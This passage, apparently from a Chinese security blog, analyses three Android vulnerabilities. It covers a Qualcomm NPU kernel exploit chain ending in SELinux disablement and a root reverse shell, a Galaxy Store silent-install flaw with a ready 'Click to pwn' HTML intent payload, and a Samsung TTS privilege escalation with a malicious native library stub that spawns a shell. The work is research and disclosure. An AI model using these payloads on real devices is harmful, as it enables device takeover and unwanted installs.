中的一些共享内存区域，并使用它来存储一个神经网络模型； 使用npu_load_network 将神经网络加载到 NPU 中； 使用npu_exec_network来执行带有async标志的神经网络。 问题在于第二步，当神经网络被加载到 NPU 中时，内核驱动程序也会保留一个记录，这是通过 alloc_network 方法实现的： 123456789101112131415static struct npu_network *alloc_network(struct npu_host_ctx *ctx, struct npu_client *client){ int32_t i; struct npu_network *network = ctx-&gt;networks; for (i = 0; i &lt; MAX_LOADED_NETWORK; i++) { if (network-&gt;id == 0) break; network++; } ... network-&gt;client = client; ... return network;} network不是动态分配的，实际上是全局变量npu_host_ctx ctx成员networks数组中的一个条目。ctx是由内核驱动的所有用户共享的，所以一次只能加载非常有限的网络。当一个npu_network被分配时，就将它的数据被保存在networks数组中，其id被返回给用户。npu_network也保存了加载它的用户的npu_client。 为了区分network的使用者，以便每个用户只能访问自己的网络。当通过network的id获得一个network时，会检查client字段，以确保用户有权利访问该network。 123456789101112131415161718192021static struct npu_network *get_network_by_hdl(struct npu_host_ctx *ctx, struct npu_client *client, uint32_t hdl) { int32_t i; struct npu_network *network = ctx-&gt;networks; ... for (i = 0; i &lt; MAX_LOADED_NETWORK; i++) { if (network-&gt;network_hdl == hdl) break; network++; } ... if (client &amp;&amp; (client != network-&gt;client)) { //&lt;-------- Check that client owns the network pr_err(&quot;network %lld doesn't belong to this client\\n&quot;, network-&gt;id); return NULL; } network_get(network); return network; } 当使用异步的ioctl调用时，当 NPU 回复时，要识别调用发起的用户。 1234567891011121314151617static void app_msg_proc(struct npu_host_ctx *host_ctx, uint32_t *msg){ ... case NPU_IPC_MSG_EXECUTE_DONE: { ... network = get_network_by_hdl(host_ctx, NULL, exe_rsp_pkt-&gt;network_hdl); ... if (!network-&gt;cmd_async) { complete(&amp;network-&gt;cmd_done); } else { ... if (npu_queue_event(network-&gt;client, &amp;kevt)) //&lt;------ queue the event to the client's event queue pr_err(&quot;queue npu event failed\\n&quot;); } network_put(network); 由于上述处理来自 NPU 的消息的代码是在内核中运行的，它依赖于npu_network包含在消息中的id，以定位发起请求的用户，然后它将作为一个事件发送到客户端的事件队列中，提示它做出响应。 当然，由于npu_network是全局数据，当文件关闭和npu_client被释放时，必须进行适当的清理，将其从npu_network中删除，以避免UAF。这在npu_host_cleanup_networks中进行。当npu_close被调用时，该函数将用于查找存储该npu_client的npu_network，并尝试使用npu_host_unload_network将其删除。 123456789101112void npu_host_cleanup_networks(struct npu_client *client){ ... for (i = 0; i &lt; MAX_LOADED_NETWORK; i++) { network = &amp;host_ctx-&gt;networks[i]; if (network-&gt;client == client) { ... npu_host_unload_network(client, &amp;unload_req); } } ...} npu_host_unload_network使用free_network将client从npu_network中移除： 12345678910int32_t npu_host_unload_network(struct npu_client *client, struct msm_npu_unload_network_ioctl *unload){ ...free_network: ... free_network(host_ctx, client, network-&gt;id); //&lt;------ zero out npu_network, which removes client ... return ret;} 但是，不是所有的路径都能到达free_network，有很多都提前返回了，但有一条错误路径不同： 123456789101112131415ret = npu_send_network_cmd(npu_dev, network, &amp;unload_packet, false);if (ret) { pr_err(&quot;NPU_IPC_CMD_UNLOAD sent failed: %d\\n&quot;, ret); /* * If another command is running on this network, * don't free_network now. */ if (ret == -EBUSY) { //&lt;----------- returns early and skip free_network pr_err(&quot;Network is running, retry later\\n&quot;); network_put(network); mutex_unlock(&amp;host_ctx-&gt;lock); return ret; } goto free_network;} 如果 npu_send_network_cmd 出现了错误，并且错误为 -EBUSY，则 free_network 将被跳过，并且 client 不会被移除。这样就会出现两个问题： 有没有可能使npu_send_network_cmd返回-EBUSY并触发这个路径？ 即使这个路径被触发，如何获得对持有被释放的npu_client引用的npu_network的访问？一旦npu_client被释放，文件将被关闭，将无法使用这个npu_client访问 NPU 驱动。因为所有对npu_network的访问都是通过对npu_client的检查来保护的，除非能够使用现在被释放的客户端进行ioctl调用，否则将无法检索到持有被释放的npu_client的npu_network。然而，使用这个被释放的客户端进行ioctl调用，需要对被释放的npu_client有访问权。 CVE-2021-1940（条件竞争）查看 npu_send_network_cmd，如果 npu_network设置了 cmd_pending ，则将返回 -EBUSY ： 1234567static int npu_send_network_cmd(struct npu_device *npu_dev, struct npu_network *network, void *cmd_ptr, bool async){ ... } else if (network-&gt;cmd_pending) { pr_err(&quot;Another cmd is pending\\n&quot;); ret = -EBUSY; 在调用npu_send_network_cmd向NPU发送命令时设置cmd_pending，在 NPU 处理完命令后被重置： 123456789101112131415161718192021222324static int npu_send_network_cmd(struct npu_device *npu_dev, struct npu_network *network, void *cmd_ptr, bool async){ ... } else { ... network-&gt;cmd_async = async; network-&gt;cmd_ret_status = 0; network-&gt;cmd_pending = true; network-&gt;trans_id = atomic_read(&amp;host_ctx-&gt;ipc_trans_id); ret = npu_host_ipc_send_cmd(npu_dev, IPC_QUEUE_APPS_EXEC, cmd_ptr); } ...}...static void app_msg_proc(struct npu_host_ctx *host_ctx, uint32_t *msg){ ... switch (msg_id) { case NPU_IPC_MSG_EXECUTE_DONE: { ... network-&gt;cmd_pending = false; 通过发布一个异步的npu_exec_network命令，然后迅速关闭文件/dev/msm_npu，该命令仍然可能正在被 NPU 处理，在这种情况下，cmd_pending 将为true。 事实证明，这也是第二个问题的解决方案。当以异步模式发送npu_exec_network任务时，我没有必要去获取包含释放的npu_client的npu_network。我只需要等待，让NPU为我完成任务。当NPU完成任务并向CPU发送RPC时，该消息将由app_msg_proc处理。 12345678910static void app_msg_proc(struct npu_host_ctx *host_ctx, uint32_t *msg){ ... case NPU_IPC_MSG_EXECUTE_V2_DONE: { ... if (network-&gt;cmd_async) { ... if (npu_queue_event(network-&gt;client, &amp;kevt)) ... 它将把network-&gt;client（现在已经被释放）传递给npu_queue_event。更重要的是，npu_queue_event对客户端的wait_queue_head_t wait执行wake_up_interruptible。 123456static int npu_queue_event(struct npu_client *client, struct npu_kevent *evt){ ... wake_up_interruptible(&amp;client-&gt;wait); return 0;} 这将调用一个存储在队列wait的中的函数，并将条目的指针作为第一个参数。因此，通过用一个假的对象替换npu_client，并让它的等待队列指向一个有控制数据的地址，可以执行任何带有一个参数的函数。因为它是在一个内核工作者上执行的，所以会以root身份执行。这个错误为CVE-2021-1940。 CVE-2021-1968（错误的调试信息输出）当使用 npu_exec_network_v2 API 执行一个network时，可以指定network的 stats_buf （可能是用于收集配置和调试信息的）： 1234567int32_t npu_host_exec_network_v2(struct npu_client *client, struct msm_npu_exec_network_ioctl_v2 *exec_ioctl, struct msm_npu_patch_buf_info *patch_buf_info){ ... network-&gt;stats_buf_u = (void __user *)exec_ioctl-&gt;stats_buf_addr; network-&gt;stats_buf_size = exec_ioctl-&gt;stats_buf_size; 当 NPU 在完成npu_exec_network_v2 后向 CPU 发送消息时，stats_buf将由app_msg_proc处理： 1234567891011static void app_msg_proc(struct npu_host_ctx *host_ctx, uint32_t *msg){ ... case NPU_IPC_MSG_EXECUTE_V2_DONE: { ... if (network-&gt;cmd_async) { ... kevt.reserved[0] = (uint64_t)network-&gt;stats_buf; kevt.reserved[1] = (uint64_t)network-&gt;stats_buf_u; if (npu_queue_event(network-&gt;client, &amp;kevt)) 其中将存储stats_buf的地址和一个用户空间的地址，作为将stats_buf复制回用户空间的目标。这些都被存储在一个事件的reserved中。当用户想要读取 stats_buf 的内容时，可以使用 npu_receive_event ioctl 调用，然后调用 npu_process_kevent 函数来处理上面用 npu_queue_event 发送的事件。 12345678910static int npu_process_kevent(struct npu_kevent *kevt){ int ret = 0; switch (kevt-&gt;evt.type) { case MSM_NPU_EVENT_TYPE_EXEC_V2_DONE: ret = copy_to_user((void __user *)kevt-&gt;reserved[1], (void *)&amp;kevt-&gt;reserved[0], //&lt;----------- 1. kevt-&gt;evt.u.exec_v2_done.stats_buf_size); ... 在上面的代码中，copy_to_user是为了将stats_buf的内容复制到用户空间。由于stats_buf的地址被存储为kevt-&gt;reserved[0]，copy_to_user的源应该是kevt-&gt;reserved[0]。但是，&amp;kevt-&gt;reserved[0]被使用，这意味着kevt的内容在reserved[0]的偏移处被复制。当然，这个内容是stats_buf的地址和用户空间的地址stats_buf_u。此外，由于 stats_buf 的大小可能远远大于 kevt 的大小，这实际上会导致 copy_to_user 的越界读取。(由于hardened usercopy，它不能读取桶中的下一个对象，但它可以被用来读取未初始化的内存)。这个错误为CVE-2021-1968。 CVE-2021-1969（错误的数据拷贝） app_msg_proc的实现中还有一个问题： 12345678910111213141516171819static void app_msg_proc(struct npu_host_ctx *host_ctx, uint32_t *msg){ ... struct npu_kevent kevt; //&lt;---------- 1. ... switch (msg_id) { case NPU_IPC_MSG_EXECUTE_V2_DONE: { ... if (network-&gt;cmd_async) { pr_debug(&quot;async cmd, queue event\\n&quot;); kevt.evt.type = MSM_NPU_EVENT_TYPE_EXEC_V2_DONE; kevt.evt.u.exec_v2_done.network_hdl = exe_rsp_pkt-&gt;network_hdl; kevt.evt.u.exec_v2_done.exec_result = exe_rsp_pkt-&gt;header.status; kevt.evt.u.exec_v2_done.stats_buf_size = stats_size; kevt.reserved[0] = (uint64_t)network-&gt;stats_buf; kevt.reserved[1] = (uint64_t)network-&gt;stats_buf_u; if (npu_queue_event(network-&gt;client, &amp;kevt)) pr_err(&quot;queue npu event failed\\n&quot;); 变量kevt 的所有字段都被初始化了吗？ 12345struct npu_kevent { struct list_head list; struct msm_npu_event evt; uint64_t reserved[4];}; 可以看到，reserved是一个长度为4的数组，但只有reserved[0]和reserved[1]被初始化。事实证明这不是一个问题，因为当kevt被npu_receive_kevent使用时，只有evt、reserved[0]和reserved[1]被使用： 1234567891011121314151617static int npu_receive_event(struct npu_client *client, unsigned long arg){ struct npu_kevent *kevt; ... if (list_empty(&amp;client-&gt;evt_list)) { ... } else { ... npu_process_kevent(kevt); //&lt;------ only uses `reserved[0]` and `reserved[1]` ret = copy_to_user(argp, &amp;kevt-&gt;evt, sizeof(struct msm_npu_event)); ... } mutex_unlock(&amp;client-&gt;list_lock); return ret;} 接着检查是否evt的所有字段都被初始化了呢？ 1234567891011121314151617struct msm_npu_event { uint32_t type; union { struct msm_npu_event_execute_done exec_done; struct msm_npu_event_execute_v2_done exec_v2_done; struct msm_npu_event_ssr ssr; uint8_t data[128]; } u; uint32_t reserved[4];};struct msm_npu_event_execute_v2_done { uint32_t network_hdl; int32_t exec_result; /* stats buf size filled */ uint32_t stats_buf_size;}; 确实都是初始化的。问题是，联合体的大小是其最大成员的大小，在msm_npu_event的例子中，是data[128]，这比msm_npu_event_execute_v2_done的大小大得多。所以会有很多未被初始化的填充。reserved[4]也是完全未被初始化的。更糟糕的是，正如我们在上面看到的，npu_receive_event将简单地把整个msm_npu_event复制到用户空间。 123456789101112131415static int npu_receive_event(struct npu_client *client, unsigned long arg){ struct npu_kevent *kevt; ... if (list_empty(&amp;client-&gt;evt_list)) { ... } else { ... ret = copy_to_user(argp, &amp;kevt-&gt;evt, sizeof(struct msm_npu_event)); ... } ...} 这意味着拷贝到用户空间中的数据包含大量为初始化数据，这个错误为CVE-2021-1969。 漏洞利用这三个漏洞加在一起，提供了非常强大的原语，既可以泄露内核地址以击败内核地址空间布局随机化，又可以用受控参数执行任意函数。获得任意内核代码执行的步骤如下： 使用CVE-2021-1968获得stats_buf的地址，然后回收它，这样就可以用受控数据填充它。 使用CVE-2021-1969获得一个内核函数的地址，以击败KASLR。 使用CVE-2021-1940，用从第一和第二步获得的信息执行任意代码。 获得受控数据的地址在前面错误的调试信息输出一节中说到，通过在异步模式下使用npu_exec_network_v2 ioctl调用，stats_buf缓冲区的地址将被复制到在加载网络时提供的一个用户空间缓冲区。stats_buf通过kzalloc分配为一个大小为0x4000的缓冲区，当npu_network通过npu_unload_network ioctl被卸载时，它将被释放。 使用 npu_exec_network_v2 触发 CVE-2021-1968 并获得指定的一个 npu_network 的 stats_buf 的地址。 使用 npu_unload_network 卸载网络，释放 stats_buf。 使用sendmsg系统调用分配一个大小为0x4000的消息缓冲区来回收释放的stats_buf。由于这种大小的分配是非常罕见的，这几乎总是在释放的 stats_buf 的地址上分配消息缓冲区。这意味着在第一步中获得的 stats_buf 的地址现在指向了消息缓冲区的内容，并可以完全控制它。 sendmsg是一个标准的linux内核堆喷射技术，可以用来分配几乎任意大小的任意数据。 击败 KASLR使用CVE-2021-1969来获取内核函数地址，以击败KASLR。回顾错误的数据拷贝一节，被复制回用户空间的未初始化变量起源于app_proc_msg的npu_kevent变量kevt。 12345678910111213static void app_msg_proc(struct npu_host_ctx *host_ctx, uint32_t *msg){ ... struct npu_kevent kevt; ... switch (msg_id) { case NPU_IPC_MSG_EXECUTE_V2_DONE: { ... if (network-&gt;cmd_async) { ... if (npu_queue_event(network-&gt;client, &amp;kevt)) ... 所以这里的未初始化变量是一个堆栈变量。注意，尽管 Android 11 在内核中提供了对自动变量初始化的支持，但设置内核配置CONFIG_INIT_STACK_ALL才可以，不是所有的供应商都启用了这个配置。特别是，在写这篇文章的时候，所有的三星设备上都没有启用这个配置。(似乎只有运行5.4内核的设备，即S21、Z flip3等，才启用这一功能）。 经过一些测试，host_irq_wq的地址似乎在未初始化变量kevt中具有完全相同的偏移。 怎么知道这个不变的地址是host_irq_wq呢？ 获取任意代码执行回顾条件竞争一节，想要利用，需要做以下的条件竞争： 接下来就是用一个合适的假对象来替换被释放的npu_client。回顾一下，npu_client的使用方式是它的等待队列被放入wake_up_interruptible： 123456static int npu_queue_event(struct npu_client *client, struct npu_kevent *evt){ ... wake_up_interruptible(&amp;client-&gt;wait); return 0;} wake_up_interruptible是__wake_up_common的一个包装，将&amp;client-&gt;wait作为wq_head传递给它，并将其他参数设置为一些默认值： 12345678910111213141516171819202122static int __wake_up_common(struct wait_queue_head *wq_head, unsigned int mode, int nr_exclusive, int wake_flags, void *key, wait_queue_entry_t *bookmark){ wait_queue_entry_t *curr, *next; int cnt = 0; lockdep_assert_held(&amp;wq_head-&gt;lock); if (bookmark &amp;&amp; (bookmark-&gt;flags &amp; WQ_FLAG_BOOKMARK)) { ... } else curr = list_first_entry(&amp;wq_head-&gt;head, wait_queue_entry_t, entry); //&lt;----------- 1. ... list_for_each_entry_safe_from(curr, next, &amp;wq_head-&gt;head, entry) { ... ret = curr-&gt;func(curr, mode, wake_flags, key); //&lt;------------ 2. ... } ...} 队列client-&gt;wait中的条目将被取出，存储在该条目中的func函数被执行，该条目是第一个参数。 所以在npu_client中要控制的关键字段是队列wait，它是一个双链的条目列表。通过用sendmsg堆喷替换释放的npu_client，使其等待队列的条目是指向控制数据stats_buf的指针，然后可以在stats_buf的适当偏移处放置一个任意的函数并让其执行。此外，由于该函数是以 wait 中的 curr 条目作为其第一个参数执行的，根据结构，它指向 stats_buf，也可以控制第一个参数 curr 中的数据。 由于前面已经从CVE-2021-1969得到了host_irq_wq的地址，可以用它来获得任何内核函数的地址。但是，不能将func设置为任意ROP小工具的地址。三星 KNOX 的实时内核保护（RKP）已经实现了一种控制流完整性（CFI）的检查形式，只允许函数调用点跳转到实际函数的开始。这被称为JOPP（面向跳跃的编程预防）。 感兴趣的读者可以参考Alexandre Adamski的 A Samsung RKP Compendium和Dong-Hoon的KNOX Kernel Mitigation Byapsses。 为了获得任意代码的执行，这里使用Brandon Azad在An iOS hacker tries Android中使用的__bpf_prog_run32函数，那就好了。正如文章中所解释的，函数__bpf_prog_run32可以用来调用通过第二个参数提供的 eBPF 字节码。 1unsigned int __bpf_prog_run32(const void *ctx, const bpf_insn *insn) 为了使用 __bpf_prog_run32，还需要另一个小工具，将第一个参数的控制权转移到第二个参数上。像这样的小工具其实并不难找，因为在Linux内核中，特别是在设备驱动代码中，经常可以看到下面这样的代码。 123456void foo(struct type_a* input) { struct type_b* priv = input-&gt;private; if (priv-&gt;ops-&gt;func) { priv-&gt;ops-&gt;func(priv, priv-&gt;some_field1, ...); }} 其中一个例子是ion_buffer_kmap_put（它实际上是内联的，所以在实际利用中使用了调用者ion_dma_buf_vunmap，但这是一个小技术细节）。 12345678static void ion_buffer_kmap_put(struct ion_buffer *buffer){ ... if (!buffer-&gt;kmap_cnt) { buffer-&gt;heap-&gt;ops-&gt;unmap_kernel(buffer-&gt;heap, buffer); //&lt;-------- 1. buffer-&gt;vaddr = NULL; }} 通过在假条目中使用ion_buffer_kmap_put作为func，在假缓冲区中使用__bpf_prog_run32作为buffer-&gt;heap-&gt;ops-&gt;unmap_kernel，将能够运行任意的 eBPF 代码。更重要的是，因为这段代码是从一个kworker中运行的，所以它是以root身份运行的。 12345root 17989 2 0 0 worker_th+ 0 I [kworker/3:2]root 17998 2 0 0 worker_th+ 0 I [kworker/1:0]root 17999 2 0 0 worker_th+ 0 I [kworker/2:1]root 18179 2 0 0 worker_th+ 0 I [kworker/u16:2]root 18212 2 0 0 worker_th+ 0 I [kworker/0:2] 绕过SELinux并获取root shell当SELinux被启用时，它可以在允许模式或强制模式下运行。当处于允许模式时，它将只审计和记录未经授权的访问，但不会阻止它们。SELinux的运行模式是由selinux_enforcing变量控制的。如果这个变量为零，那么SELinux将在允许模式下运行。通常，对系统安全至关重要的变量将受到内核数据保护（KDP）的保护，通过使用__kdp_ro或__rkp_ro属性将其标记为只读（这个属性表明该变量处于只读页面，其修改受到管理程序调用的保护）。然而，在测试的固件上，以及一些S系列设备的源代码上，这个变量似乎没有被保护。 1234//In security/selinux/hooks.c#ifdef CONFIG_SECURITY_SELINUX_DEVELOPstatic int selinux_enforcing_boot;int selinux_enforcing; 在这些设备中，配置CONFIG_SECURITY_SELINUX_DEVELOP被启用。从三星下载的内核源代码来看，最近的2021年6月的固件似乎也是如此（来自S21源代码），尽管较新版本的固件似乎对selinux_enforcing增加了保护。在对应于较新固件的源代码中（S20的G981USQS2DUH2/G981USQS2DUI1，大约是9月的更新），selinux_enforcing变量被标记为__kdp_ro。 12345//In security/selinux/hooks.c#ifdef CONFIG_SECURITY_SELINUX_DEVELOP#if (defined CONFIG_KDP_CRED &amp;&amp; defined CONFIG_SAMSUNG_PRODUCT_SHIP)static int selinux_enforcing_boot __kdp_ro;int selinux_enforcing __kdp_ro; 并且现在受到KNOX的保护。然而，由于这篇文章中的bug在2021年7月被修复，仍然可以通过将selinux_enforcing覆盖为0来禁用SELinux。 在SELinux被禁用后，可以通过内核代码执行原语调用call_usermodehelper函数，以生成一个反向shell。由于该代码是从kworker中调用的，所以shell也会有root用户ID。漏洞利用可以在此找到。 参考链接https://securitylab.github.com/research/qualcomm_npu/","link":"/2022/05/14/Qualcomm-NPU-%E9%A9%B1%E5%8A%A8%E6%BC%8F%E6%B4%9E-CVE-2021-1940-CVE-2021-1968-CVE-2021-1969/"},{"title":"Samsung CVE-2022-22288 - 点击安装App","text":"影响范围Galaxy Store 4.5.36.5 之前的版本。 效果不需要用户同意，自动下载安装三星应用商店中的白名单App，但是会弹出应用商店的界面。 漏洞详情问题在于Samsung Galaxy App Store中的类com.sec.android.app.samsungapps.deeplink.DetailPageDeepLink 的方法 putDetailCommonExtra（在4.2.22.3中并没有这个方法，对应的方法是showContentDetailForDeeplink）： 123456public void putDetailCommonExtra(Context context) { ... if (isDirectInstall() &amp;&amp; appManager.enableDDI(getSender(), getDetailID(), DeeplinkManager.getInstance().getInternalDeeplink())) { this.intent.putExtra(DeepLink.EXTRA_DEEPLINK_DIRECT_INSTALL, isDirectInstall()); this.intent.putExtra(&quot;sender&quot;, getSender()); } isDirectInstall()：从web Intent的查询参数directInstall中获取，值为True或False。 getSender()：包名或者是发送web Intent的URL，通过Intent的string extra：sender获取。 getDetailID()：从web Intent的查询参数appId中获取，也就是要安装的App的包名。 enableDDI()代码如下： 123456789public boolean enableDDI(String sender, String appId, boolean isInternalDeeplink) { if (isDDITestMode()) { return true; } if ((!isGalaxyStore(sender) || !isInternalDeeplink) &amp;&amp; !isWhiteListAppForOneClick(sender, appId)) { return false; } return true;} isGalaxyStore()：以下两种情况会返回True：一，Intent sender的包名为com.sec.android.app.samsungapps；二，发送web Intent的网站为http://com.sec.android.app.samsungapps。 isWhiteListAppForOneClick()：如果目标包名在三星的白名单内返回True。 Intent sender的包名可以通过将Intent string extra 设置为android.intent.extra.REFERRER_NAME=com.sec.android.app.samsungapps来进行控制。 可以通过以下POST请求获取三星的白名单： 123456789101112131415161718POST /ods.as?reqId=2355 HTTP/1.1Accept: image/webpContent-Type: text/plain; charset=UTF-8User-Agent: Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)Host: us-odc.samsungapps.comConnection: closeAccept-Encoding: gzip, deflateContent-Length: 952 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot; ?&gt;&lt;SamsungProtocol networkType=&quot;0&quot; version2=&quot;3&quot; lang=&quot;EN&quot; openApiVersion=&quot;30&quot; deviceModel=&quot;SM-G991B&quot; deviceMakerName=&quot;samsung&quot; deviceMakerType=&quot;0&quot; mcc=&quot;310&quot; mnc=&quot;00&quot; csc=&quot;XME&quot; odcVersion=&quot;4.5.30.5&quot; scVersion=&quot;1000000&quot; storeFilter=&quot;themeDeviceModel=SM-G991B_TM||OTFVersion=11010001||gearDeviceModel=SM-G991B_SM-R800||gOSVersion=4.0.0&quot;supportFeature=&quot;ARW||AOD&quot; version=&quot;6.8&quot; filter=&quot;1&quot; odcType=&quot;01&quot; cacheVersion=&quot;1&quot; systemId=&quot;&lt;redacted&gt;&quot; sessionId=&quot;&lt;redacted&gt;&quot; logId=&quot;&lt;redacted&gt;&quot; deviceFeature=&quot;locale=en_US||abi32=armeabi-v7a:armeabi||abi64=arm64-v8a&quot; userMode=&quot;0&quot;&gt;&lt;request name=&quot;whiteAppInfo&quot; id=&quot;2355&quot; numParam=&quot;4&quot; transactionId=&quot;&lt;redacted&gt;&quot;&gt;&lt;param name=&quot;accountCountry&quot;&gt;USA&lt;/param&gt;&lt;param name=&quot;guestDownloadInfo&quot;&gt;Y&lt;/param&gt;&lt;param name=&quot;accountMcc&quot;&gt;310&lt;/param&gt;&lt;param name=&quot;requestTypeCode&quot;&gt;0&lt;/param&gt;&lt;/request&gt;&lt;/SamsungProtocol&gt; 到这里基本就差不多了，F-Secure 发现了一个包名live.hatch.russa，这个包在白名单里，但是应用商店里没有。因此 F-Secure 用自己的App（包名设置为live.hatch.russa）上传到商店，来利用白名单。 F-Secure 使用的验证程序如下： 客户端程序源码在这里。 服务端程序源码在这里。 后来 F-Secure 又上传了几次自己的App（包名设置为live.hatch.russa）到三星应用商店，最后收到了版权警告，大概三星对白名单也做了一下处理吧。 漏洞利用1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Click to pwn&lt;/h1&gt;&lt;a id=&quot;yayidyay&quot; rel=&quot;noreferrer&quot; href=&quot;intent://apps.samsung.com/appquery/appDetail.as?appId=com.sina.weibo&amp;directInstall=true&amp;installReferrer=yayreferreryay&amp;directOpen=true&amp;simpleMode=true#Intent;action=android.intent.action.VIEW;package=com.sec.android.app.samsungapps;scheme=http;S.android%2eintent%2eextra%2eREFERRER_NAME=http://com.sec.android.app.samsungapps;end&quot;&gt;PWN&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;","link":"/2022/05/06/Samsung-CVE-2022-22288-%E7%82%B9%E5%87%BB%E5%AE%89%E8%A3%85App/"},{"title":"Samsung TTS 提权漏洞(CVE-2019-16253)","text":"前言Text-To-Speech引擎是在Android手机中默认开启的，但是厂商在实现的时候出了问题，就是本章的CVE-2019-16253。 影响范围SamsungTTS before 3.0.02.7/3.0.00.101补丁信息： Android N,O or older : 3.0.00.101 Android P : 3.0.02.7 漏洞细节Samsung TTS以system uid进行运行，提供TTS功能，因此漏洞利用可以以system权限返回一个shell。 com.samsung.SMT.mgr.LangPackMgr$2动态注册了一个receiver，其接收带有com.samsung.SMT.ACTION_INSTALL_FINISHED的Intent。receiver盲目的信任传入数据中的SMT_ENGINE_PATH，经过一些处理以后，LangPackMgr.updateEngine通过调用com.samsung.SMT.engine.SmtTTS-&gt;reloadEngine（最终调用System-&gt;load）创建一个线程，加载执行SMT_ENGINE_PATH指向的so库，导致在Samsung TTS执行任意代码。 还有两点： 漏洞不需要手动启动恶意APP，只要启用了Samsung TTS，它监听应用程序安装卸载，当发现有以com.samsung.SMT.lang开头的包安装时，就会启动该应用程序的服务； Samsung TTS将在设备启动时，运行注册的库，因此可以实现静默持久化。 漏洞分析123456789101112131415161718192021222324252627282930313233package com.samsung.SMT.mgr;class LangPackMgr$2 extends BroadcastReceiver {//... public void onReceive(Context arg10, Intent arg11) { int v7 = -1; if(arg11.getAction().equals(&quot;com.samsung.SMT.ACTION_INSTALL_FINISHED&quot;)) { //... int v0_1 = arg11.getIntExtra(&quot;SMT_ENGINE_VERSION&quot;, v7); String v2 = arg11.getStringExtra(&quot;SMT_ENGINE_PATH&quot;); // 1 if(v0_1 &gt; SmtTTS.get().getEngineVersion() &amp;&amp; (CString.isValid(v2))) { if(CFile.isExist(v2)) { LangPackMgr.getUpdateEngineQueue(this.a).add(new LangPackMgr$UpdateEngineInfo(v0_1, v2)); CLog.i(CLog$eLEVEL.D, &quot;LangPackMgr - Add candidate engine [%d][%s]&quot;, new Object[]{Integer.valueOf(v0_1), v2}); } else { CLog.e(&quot;LangPackMgr - Invalid engine = &quot; + v2); } }//... LangPackMgr.decreaseTriggerCount(this.a); if(LangPackMgr.getTriggerPackageCount(this.a) != 0) { return; } if(LangPackMgr.getUpdateEngineQueue(this.a).size() &lt;= 0) { return; } LangPackMgr.doUpdateEngine(this.a); // 2 } }} 12345678910111213141516171819202122232425262728293031323334353637383940414243 private void updateEngine() { if(this.mThreadUpdateEngine == null || !this.mThreadUpdateEngine.isAlive()) { this.mThreadUpdateEngine = new LangPackMgr$EngineUpdateThread(this, null); this.mThreadUpdateEngine.start(); } } LangPackMgr$EngineUpdateThread(LangPackMgr arg1, LangPackMgr$1 arg2) { this(arg1); } public void run() { //... if(LangPackMgr.getUpdateEngineQueue(this.a).size() &lt;= 0) { return; } try { v1 = LangPackMgr.getUpdateEngineQueue(this.a).poll(); while(true) { if(LangPackMgr.getUpdateEngineQueue(this.a).size() &lt;= 0) { goto label_20; } v0_1 = LangPackMgr.getUpdateEngineQueue(this.a).poll();//... if(v1 != null &amp;&amp; ((LangPackMgr$UpdateEngineInfo)v1).VERSION &gt; SmtTTS.get().getEngineVersion()) { CHelper.get().set_INSTALLED_ENGINE_PATH(((LangPackMgr$UpdateEngineInfo)v1).PATH); if(SmtTTS.get().reloadEngine()) { ----- public boolean reloadEngine() {//... this.stop(); try { String v0_2 = CHelper.get().INSTALLED_ENGINE_PATH(); if(CString.isValid(v0_2)) { System.load(v0_2); // &lt;- triggers load } else { goto label_70; } } 以上可知： SMT_ENGINE_VERSION应该大于内置的版本361811291； mTriggerCount应该首先被增加，可以通过提供一个包名以com.samsung.SMT.lang开始的包实现。com.samsung.SMT.SamsungTTSService注册了两个receiver，其中一个用于扫描包的前缀，并增加mTriggerCount。 下面的代码将调用恶意服务而不需要交互： 1234567891011121314151617181920212223package com.samsung.SMT.mgr;//...class LangPackMgr$1 extends BroadcastReceiver { LangPackMgr$1(LangPackMgr arg1) { this.a = arg1; super(); } public void onReceive(Context arg4, Intent arg5) { // 监听包安装卸载 String v0 = arg5.getAction(); String v1 = arg5.getData().getSchemeSpecificPart(); if(((v0.equals(&quot;android.intent.action.PACKAGE_ADDED&quot;)) || (v0.equals(&quot;android.intent.action.PACKAGE_CHANGED&quot;)) || (v0.equals(&quot;android.intent.action.PACKAGE_REMOVED&quot;))) &amp;&amp; (v1 != null &amp;&amp; (v1.startsWith(&quot;com.samsung.SMT.lang&quot;)))) { this.a.syncLanguagePack(); } }}//... private void triggerLanguagePack() { if(this.mThreadTriggerLanguagePack == null || !this.mThreadTriggerLanguagePack.isAlive()) { this.mThreadTriggerLanguagePack = new LangPackMgr$LanguagePackTriggerThread(this, null); this.mThreadTriggerLanguagePack.start(); } } 123456789101112131415161718192021222324252627282930package com.samsung.SMT.mgr;//...class LangPackMgr$LanguagePackTriggerThread extends Thread { //... public void run() { Object v0_1; HashMap v3 = new HashMap(); HashMap v4 = new HashMap(); try { Iterator v5 = LangPackMgr.f(this.langpackmgr).getPackageManager().getInstalledPackages(0x2000).iterator(); while(true) { //... if(!((PackageInfo)v0_1).packageName.startsWith(&quot;com.samsung.SMT.lang&quot;)) { continue; } break; } } catch(Exception v0) { goto label_53; } try { Intent v1_1 = new Intent(((PackageInfo)v0_1).packageName); v1_1.setPackage(((PackageInfo)v0_1).packageName); LangPackMgr.f(this.langpackmgr).startService(v1_1); // 启动对应的APP的服务 LangPackMgr.increaseTriggerCount(this.langpackmgr); Samsung TTS加载的库需要实现一个接口，以看上去像一个language pack，这个通过逆向默认的库来实现。 最终的流程如下： 漏洞利用so库编写123456789101112131415161718192021222324252627282930......#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR , &quot;mercury-native&quot;, __VA_ARGS__)JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_initialize ( JNIEnv* env, jobject thiz ){ return -1;}// int setLanguage(String arg1, String arg2, String arg3, String arg4, int arg5, int arg6) JNIEXPORT jint JNICALL Java_com_samsung_SMT_engine_SmtTTS_setLanguage(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6){ return 1;}//(java.lang.String, java.lang.String, java.lang.String, java.lang.String, int, int)JNIEXPORT jint Java_com_samsung_SMT_engine_SmtTTS_getIsLanguageAvailable(JNIEnv* env, jobject thiz, jstring j1, jstring j2, jstring j3, jstring j4, jint j5, jint j6){ return -1;}......__attribute__((constructor))static void doload() { LOGE(&quot;SMTEXP: my uid is %d, pid is %d&quot;, getuid(), getpid()); run_socket_sh_shell();} APK编写注册一个服务： 